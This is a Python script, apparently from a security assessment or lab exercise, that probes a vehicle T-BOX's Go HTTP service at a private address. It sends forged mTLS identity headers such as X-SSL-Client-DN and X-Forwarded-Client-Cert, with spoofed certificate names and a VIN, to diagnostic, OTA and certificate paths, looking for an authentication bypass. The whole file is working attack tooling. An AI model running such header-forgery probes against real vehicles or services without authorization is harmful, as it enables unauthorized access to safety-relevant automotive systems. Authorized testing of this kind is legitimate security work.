#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Test the "TLS front end injects the client identity into a header, the Go app
trusts it" hypothesis against T-BOX 8080, and re-check the route surface with
those headers present.

Rationale: 8443 presents an OpenSSL-flavoured CertificateRequest (splits
signature_algorithms / signature_algorithms_cert) while plaintext :8443 answers
with Go net/http's "Client sent an HTTP request to an HTTPS server."  If a proxy
terminates mTLS on 8443 and forwards to the Go app, the app may authorise on an
injected header (`X-SSL-Client-*`, `X-Forwarded-Client-Cert`, ...) that we can
forge by talking to the Go app directly.

Judgement criteria (written before running):
  * hypothesis holds  -> some header value changes status/length/body on /healthz
                         or turns a 404 into a 200/401/403 on a known-good path
  * hypothesis dies   -> every header value is byte-identical to baseline
"""
import hashlib
import http.client
import itertools
import json
import sys

HOST = "10.230.164.3"
PORT = 8080
VIN = "CV6FF52FEE9EDDD86"
TIMEOUT = 6.0

IDENT_HEADERS = [
    "X-SSL-Client-DN", "X-SSL-Client-S-DN", "X-SSL-Client-CN",
    "X-SSL-Client-Cert", "X-SSL-Client-Verify", "X-SSL-Client-Serial",
    "X-Client-DN", "X-Client-Cert", "X-Client-CN", "X-Client-Verified",
    "X-Forwarded-Client-Cert", "X-Forwarded-Client-DN", "X-Forwarded-User",
    "X-Forwarded-Tls-Client-Cert", "X-Forwarded-Ssl",
    "X-Authenticated-User", "X-Authenticated-Client", "X-Auth-User",
    "X-Client-Identity", "X-Client-Subject", "X-Tls-Client-Dn",
    "X-Tbox-Client", "X-Tbox-Cert", "X-Tbox-Identity", "X-Tbox-Claim",
    "X-Device-Cert", "X-Vehicle-Cert", "X-Fleet-Client", "X-Mtls-Subject",
    "Ssl-Client-Dn", "Ssl-Client-Cert", "Ssl-Client-Verify",
    "X-Client-Certificate", "Client-Dn", "X-Client-Cert-Chain",
]

VALUES = [
    "CN=tbox",
    "CN=CV6 Fleet Diagnostics Root",
    "CN=diag-client,OU=Fleet,O=CyberCar",
    "/CN=tbox",
    "1",
    "SUCCESS",
    VIN,
]

PROBE_PATHS = ["/", "/healthz", "/diag", "/diagnostics", "/status", "/ota",
               "/tbox", "/certs", "/ca.crt", "/vehicle", "/vehicles",
               "/vehicles/" + VIN, "/v1/diag", "/api/healthz"]


def request(path, headers=None, method="GET"):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=TIMEOUT)
    try:
        conn.request(method, path, headers=headers or {})
        r = conn.getresponse()
        body = r.read()
        return r.status, len(body), hashlib.sha256(body).hexdigest()[:16], body[:120]
    except Exception as e:
        return None, None, None, f"{type(e).__name__}: {e}"
    finally:
        try:
            conn.close()
        except Exception:
            pass


def main():
    print(f"### target {HOST}:{PORT}  ident-header trust battery")
    base = {}
    for p in PROBE_PATHS:
        base[p] = request(p)
    print("--- baseline (no extra headers) ---")
    for p in PROBE_PATHS:
        st, ln, h, b = base[p]
        print(f"  {p:34s} {st} len={ln} sha={h} {b!r}")

    print()
    print("--- header battery on /healthz and / ---")
    diffs = 0
    for hname in IDENT_HEADERS:
        for val in VALUES:
            for p in ("/healthz", "/"):
                st, ln, h, b = request(p, {hname: val})
                bs = base[p]
                if (st, ln, h) != (bs[0], bs[1], bs[2]):
                    diffs += 1
                    print(f"  DIFF {hname}: {val!r} on {p} -> {st} len={ln} {b!r}")
    print(f"  total diffs = {diffs}")

    print()
    print("--- same headers, on gate-like paths (looking for 404 -> non-404) ---")
    hits = 0
    for p in PROBE_PATHS:
        if p in ("/", "/healthz"):
            continue
        hdrs = {h: "CN=tbox" for h in ("X-SSL-Client-DN", "X-Forwarded-Client-Cert",
                                       "X-Client-DN", "Ssl-Client-Dn")}
        st, ln, h, b = request(p, hdrs)
        bs = base[p]
        if (st, ln, h) != (bs[0], bs[1], bs[2]):
            hits += 1
            print(f"  DIFF {p} -> {st} len={ln} {b!r}")
    print(f"  total diffs = {hits}")

    print()
    print("--- combined all-headers request on / and /healthz ---")
    allh = {h: ("CN=tbox" if "CERT" not in h and "Cert" not in h else "1") for h in IDENT_HEADERS}
    for p in ("/", "/healthz", "/diag"):
        st, ln, h, b = request(p, allh)
        print(f"  {p:34s} {st} len={ln} sha={h} {b!r}")

    print()
    print("RESULT: " + ("HEADER-TRUST SIGNAL FOUND" if (diffs + hits) else
                       "no signal - every identity header is byte-identical to baseline"))


if __name__ == "__main__":
    main()
